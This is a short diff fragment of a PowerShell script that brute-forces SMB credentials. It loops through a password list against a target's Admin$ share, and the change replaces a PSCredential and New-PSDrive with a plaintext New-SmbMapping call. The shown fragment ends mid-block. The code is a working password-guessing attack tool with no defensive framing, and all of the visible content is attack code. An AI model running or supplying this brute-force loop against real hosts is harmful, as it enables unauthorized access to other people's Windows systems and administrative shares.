@@ -14,12 +14,11 @@ foreach($ps in Get-Content $pass) {
 
     Write-Progress -Activity 'Testing SMB Brute Force' -CurrentOperation $ps -PercentComplete ((($counter++) / $passcount) * 100)
     $u = $user -replace "^\.\\", "$host\"
-    $c = New-Object System.Management.Automation.PSCredential $u, ($ps | ConvertTo-SecureString -AsPlainText -Force)
     try {
 
-        if (New-PSDrive -Name Share -PSProvider FileSystem -Root \\$target\Admin$ -Credential $c -EA SilentlyContinue) {
+        if (new-smbmapping -remotepath \\$target -username $u -password $ps -EA SilentlyContinue) {
 
-            Remove-PSDrive Share
+            
 
     
 
